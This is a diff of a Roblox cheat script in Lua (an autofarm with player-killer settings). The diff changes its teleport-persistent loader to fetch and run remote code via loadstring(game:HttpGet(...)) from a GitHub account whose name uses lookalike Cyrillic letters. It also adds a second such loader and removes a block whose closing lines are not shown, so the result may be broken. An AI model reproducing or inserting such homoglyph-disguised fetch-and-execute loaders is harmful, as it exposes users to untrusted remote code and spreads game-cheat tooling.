@@ -1,6 +1,8 @@
-queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/vfx-qudsa/newguiauto/refs/heads/main/.lua'))()")
+queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/vfx-qудса/asfsadasdasdasdsa/refs/heads/main/.lua'))()")
 
-_G.AutofarmEnabled = false
+queue_on_teleport("_G.AutofarmEnabled = true; loadstring(game:HttpGet('https://raw.githubusercontent.com/vfx-qудса/newguiauto/refs/heads/main/.lua'))()")
+
+_G.AutofarmEnabled = true
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local Workspace = game:GetService("Workspace")
@@ -13,19 +15,6 @@ local PlayerKillerSettings = {
 }
 
 while _G.AutofarmEnabled do
-    pcall(function()
-        local teleported = false
-        task.spawn(function()
-            while not teleported do
-                if Workspace:FindFirstChild("Shop") then
-                    local humanoidRootPart = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
-                    humanoidRootPart.CFrame = CFrame.new(185, 66, -26)
-                    teleported = true
-                    break
-                end
-                task.wait(0.1)
-            end
-        end)
         
         task.wait(1)
         
